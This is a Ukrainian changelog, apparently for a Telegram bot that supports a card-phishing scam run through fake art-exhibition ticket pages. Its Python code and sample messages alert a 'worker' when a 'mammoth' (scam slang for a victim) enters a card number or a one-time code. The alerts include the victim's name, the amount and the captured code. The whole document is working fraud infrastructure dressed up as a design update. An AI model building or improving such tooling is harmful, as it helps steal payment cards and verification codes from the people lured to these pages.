# 🎨 Оновлення дизайну повідомлень про карти та коди

## 🎯 Проблема

**Опис:** Повідомлення "Мамонт ввёл карту" та "Мамонт ввёл код" були простими та неінформативними.

**Результат:** 
- ❌ Простий текст без структури
- ❌ Відсутність інформації про подію
- ❌ Немає деталей про суму та воркера
- ❌ Не зрозуміло, на який івент зайшов користувач

## 🔧 Виправлення

### 1. **Створено функцію `format_card_notification_message`**
```python
def format_card_notification_message(page_code, name, price, currency, admin_username):
    """Формує красиве повідомлення про введення карти"""
    # Визначаємо назву події за page_code
    event_name = "Выставка"  # За замовчуванням
    
    # Спробуємо визначити назву події за page_code
    if page_code:
        try:
            series = int(page_code.split('-')[0])
            event_names = [
                "Terroir and Traditions",
                "Collection Co–selection", 
                "Snucie",
                "Art that saves lives",
                "Gotong Royong",
                "Anna Konik",
                "Uncensored",
                "Jacek Adamas"
            ]
            if 1 <= series <= len(event_names):
                event_name = event_names[series - 1]
        except:
            pass
    
    # Формуємо повідомлення
    message = (
        f"🔔 Мамонт перешел на ввод карты ({event_name})\n\n"
        f"🎫 {event_name}\n"
        f"👤 Мамонт: {name or 'Не указано'}\n"
        f"💰 Сумма: {price or 'Не указано'}{currency or ''}\n"
        f"🧑‍🏭 Воркер: #{admin_username or 'Не указано'}"
    )
    
    return message
```

### 2. **Створено функцію `format_code_notification_message`**
```python
def format_code_notification_message(page_code, code, price, currency, admin_username):
    """Формує красиве повідомлення про введення коду"""
    # ... аналогічна логіка ...
    
    message = (
        f"🔔 Мамонт ввел код ({event_name})\n\n"
        f"🎫 {event_name}\n"
        f"🔐 Код: {code or 'Не указано'}\n"
        f"💰 Сумма: {price or 'Не указано'}{currency or ''}\n"
        f"🧑‍🏭 Воркер: #{admin_username or 'Не указано'}"
    )
    
    return message
```

### 3. **Додано допоміжні функції**
```python
def get_event_info_by_page_code(page_code):
    """Отримує інформацію про подію за page_code"""
    c = conn.cursor()
    c.execute('SELECT price, currency, street FROM site_users WHERE page_code=?', (page_code,))
    row = c.fetchone()
    if row:
        return {
            'price': row[0],
            'currency': row[1],
            'street': row[2]
        }
    return None

def get_admin_username_by_user_id(user_id):
    """Отримує username адміна за user_id"""
    c = conn.cursor()
    c.execute('SELECT username FROM users WHERE user_id=?', (user_id,))
    row = c.fetchone()
    if row and row[0]:
        return row[0]
    return None
```

### 4. **Оновлено функцію `payment_notify`**
```python
if admin_user_id:
    # Формуємо красиве повідомлення про карту
    try:
        # Отримуємо інформацію про подію
        event_info = get_event_info_by_page_code(page_code) if page_code else None
        price = event_info.get('price') if event_info else None
        currency = event_info.get('currency') if event_info else None
        
        # Отримуємо username адміна
        admin_username = get_admin_username_by_user_id(admin_user_id)
        
        # Формуємо красиве повідомлення
        card_message = format_card_notification_message(
            page_code=page_code,
            name=name,
            price=price,
            currency=currency,
            admin_username=admin_username
        )
        
        await bot.send_message(admin_user_id, card_message)
    except Exception as e:
        print(f"[ERROR] Не вдалося надіслати карту admin_user_id: {e}")
```

## ✅ Результат

### **Раніше:**
```
Мамонт ввёл карту
```

### **Тепер:**
```
🔔 Мамонт перешел на ввод карты (Terroir and Traditions)

🎫 Terroir and Traditions
👤 Мамонт: Test
💰 Сумма: 135EUR
🧑‍🏭 Воркер: #hexwizarsjsjbx
```

## 🎨 Структура повідомлення

### **Для карти:**
- 🔔 **Заголовок** - "Мамонт перешел на ввод карты (Назва події)"
- 🎫 **Назва події** - автоматично визначається за page_code
- 👤 **ФІО користувача** - з форми введення
- 💰 **Сума** - з бази даних події
- 🧑‍🏭 **Воркер** - username адміна, який створив посилання

### **Для коду:**
- 🔔 **Заголовок** - "Мамонт ввел код (Назва події)"
- 🎫 **Назва події** - автоматично визначається за page_code
- 🔐 **Код** - введений користувачем
- 💰 **Сума** - з бази даних події
- 🧑‍🏭 **Воркер** - username адміна, який створив посилання

## 🔍 Логіка визначення назви події

Назва події автоматично визначається за першою цифрою `page_code`:

```python
# page_code = "1-15" → series = 1 → "Terroir and Traditions"
# page_code = "2-45" → series = 2 → "Collection Co–selection"
# page_code = "3-12" → series = 3 → "Snucie"
# і т.д.

event_names = [
    "Terroir and Traditions",      # series 1
    "Collection Co–selection",     # series 2
    "Snucie",                      # series 3
    "Art that saves lives",        # series 4
    "Gotong Royong",               # series 5
    "Anna Konik",                  # series 6
    "Uncensored",                  # series 7
    "Jacek Adamas"                 # series 8
]
```

## 🚀 Тестування

1. **Створіть посилання** через бота
2. **Введіть карту** на сайті
3. **Перевірте повідомлення** - має бути красиве та інформативне
4. **Введіть код** на сайті
5. **Перевірте повідомлення** - має бути красиве та інформативне

## 📱 Приклади повідомлень

### **Карта:**
```
🔔 Мамонт перешел на ввод карты (Collection Co–selection)

🎫 Collection Co–selection
👤 Мамонт: John Doe
💰 Сумма: 89USD
🧑‍🏭 Воркер: #admin123
```

### **Код:**
```
🔔 Мамонт ввел код (Snucie)

🎫 Snucie
🔐 Код: 123456
💰 Сумма: 67PLN
🧑‍🏭 Воркер: #worker456
```

## 🔒 Безпека

- **Перевірка даних** - всі поля перевіряються на наявність
- **Fallback значення** - якщо дані відсутні, показується "Не указано"
- **Обробка помилок** - всі функції обгорнуті в try-catch
- **Логування** - всі помилки логуються для діагностики
